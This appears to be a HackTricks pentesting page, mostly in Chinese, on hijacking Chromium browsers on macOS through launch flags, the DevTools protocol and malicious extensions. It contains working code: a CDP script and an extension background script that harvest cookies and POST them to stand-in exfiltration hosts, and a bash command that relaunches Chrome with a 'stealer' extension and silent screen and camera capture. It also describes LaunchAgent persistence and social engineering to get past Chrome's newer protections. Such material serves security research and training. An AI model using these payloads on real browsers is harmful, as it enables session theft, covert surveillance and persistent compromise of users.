# macOS Chromium 注入

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

基于 Chromium 的浏览器（如 Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi 和 Opera）都使用相同的命令行开关、偏好文件和 DevTools 自动化接口。在 macOS 上，任何有 GUI 访问权限的用户都可以终止现有的浏览器会话并以任意 flags、扩展或 DevTools 端点重新打开它们，这些都会在目标的权限范围下运行。

#### 在 macOS 上使用自定义 flags 启动 Chromium

macOS 每个 Chromium 配置文件只保留一个 UI 实例，因此通常需要强制关闭浏览器来进行插桩（例如使用 `osascript -e 'tell application "Google Chrome" to quit'`）。攻击者通常通过 `open -na "Google Chrome" --args <flags>` 重新启动浏览器，这样就可以在不修改应用包的情况下注入参数。将该命令封装在用户 LaunchAgent（`~/Library/LaunchAgents/*.plist`）或登录 hook 中可以确保被篡改的浏览器在重启/注销后被重新启动。

#### `--load-extension` Flag

`--load-extension` 标志会自动加载未打包的扩展（以逗号分隔的路径）。将其与 `--disable-extensions-except` 配合使用可以阻止合法扩展，仅强制运行你的 payload。恶意扩展可以请求高危权限，例如 `debugger`、`webRequest` 和 `cookies`，从而转向 DevTools 协议、修改 CSP 头、降级 HTTPS，或在浏览器一启动就外传会话数据。

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

这些开关通过 TCP 或管道公开 Chrome DevTools Protocol (CDP)，使外部工具能够驱动浏览器。Google 观察到该接口被大量信息窃取器滥用，因此从 Chrome 136（2025 年 3 月）开始，除非浏览器使用非标准的 `--user-data-dir` 启动，否则这些开关对默认配置文件将被忽略。这在真实配置文件上强制执行 App-Bound Encryption，但攻击者仍然可以生成一个新的配置文件，诱使受害者在其中进行身份验证（钓鱼/排查协助），并通过 CDP 收集 cookies、tokens、设备信任状态或 WebAuthn 注册信息。

#### `--user-data-dir` Flag

该标志将整个浏览器配置文件（历史、Cookies、登录数据、偏好文件等）重定向到攻击者控制的路径。当将现代 Chrome 构建与 `--remote-debugging-port` 结合使用时，这是必须的；它还将被篡改的配置文件隔离，这样你就可以放入预先填充的 `Preferences` 或 `Secure Preferences` 文件来禁用安全提示、自动安装扩展并更改默认方案。

#### `--use-fake-ui-for-media-stream` Flag

该开关绕过摄像头/麦克风的权限提示，因此任何调用 `getUserMedia` 的页面都会立即获得访问权限。将其与诸如 `--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk` 之类的标志或 CDP 的 `Browser.grantPermissions` 命令结合使用，可在无用户交互的情况下静默捕获音视频、共享桌面，或通过 WebRTC 权限检查。

## 远程调试与 DevTools 协议滥用

一旦 Chrome 使用专用的 `--user-data-dir` 和 `--remote-debugging-port` 重新启动，你就可以通过 CDP（例如使用 `chrome-remote-interface`、`puppeteer` 或 `playwright`）附加并编写高权限的自动化流程：

- **Cookie/会话窃取：** `Network.getAllCookies` 和 `Storage.getCookies` 返回 HttpOnly 值，即使在 App-Bound Encryption 通常会阻止文件系统访问的情况下也是如此，因为 CDP 会要求正在运行的浏览器去解密它们。
- **权限篡改：** `Browser.grantPermissions` 和 `Emulation.setGeolocationOverride` 可让你绕过摄像头/麦克风提示（尤其是与 `--use-fake-ui-for-media-stream` 结合时）或伪造基于位置的安全检查。
- **击键/脚本注入：** `Runtime.evaluate` 在活动标签页内执行任意 JavaScript，能够进行凭证提取、DOM 修改，或注入能在导航后仍存活的持久化信标。
- **实时外传：** `Network.webRequestWillBeSentExtraInfo` 和 `Fetch.enable` 可以实时拦截经过认证的请求/响应，而无需触及磁盘产物。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## 基于扩展的注入 via Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (extensions stay in their context) and enables:

- 通过 `Network.getAllCookies`/`Fetch.getResponseBody` 静默窃取 cookies 和凭证。
- 修改站点权限（camera, microphone, geolocation）并绕过安全中间页，使钓鱼页面能够伪装成 Chrome 对话框。
- 通过编程驱动 `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior` 或 `Security.handleCertificateError`，在路径上篡改 TLS 警告、下载或 WebAuthn 提示。

Load the extension with `--load-extension`/`--disable-extensions-except` so no user interaction is required. 一个用于武器化该 API 的最小 background 脚本如下所示：
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
扩展还可以订阅 `Debugger.paused` 事件，以读取 JavaScript 变量、修补内联脚本，或设置在导航后仍然存在的自定义断点。由于一切都在用户的 GUI 会话内运行，Gatekeeper 和 TCC 不会被触发，因此对于已经在用户上下文中获得执行的 malware 来说，这种技术非常理想。

### 工具

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - 自动化 Chromium 启动，加载 payload extensions 并暴露交互式 CDP 钩子。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - 类似的工具，侧重于为 macOS 操作员提供流量拦截和浏览器插装。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js 库，用于在 `--remote-debugging-port` 实例启动后脚本化 Chrome DevTools Protocol 转储 (cookies, DOM, permissions)。

### 示例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
在 tools links 中查找更多示例。

## 参考资料

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
